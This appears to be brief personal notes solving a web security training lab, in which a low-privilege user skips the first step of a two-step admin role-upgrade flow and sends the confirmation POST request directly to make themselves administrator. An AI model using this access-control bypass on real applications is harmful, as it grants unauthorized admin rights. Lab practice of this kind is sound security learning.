# recon

## log in details
- administrator:admin
- wiener:peter


##  administrator page
### upgrade user
- url: POST /admin-roles    request_body:  username=carlos&action=upgrade
    #### step2: confirmation: yes
    - POST /admin-oles request body: action=upgrade&confirmed=true&username=carlos


# solution
let's use the last url to upgrade ourselves
- login using wiener:peter
- send the request POST /admin-roles and request body: http:action=upgrade&confirm=true&username=wiener
notice the lab is solved, and you are now an administrator;
- navigate to /admin
- upgrade carlos
- congrats you solved the lab...


HAPPY HACKING :)
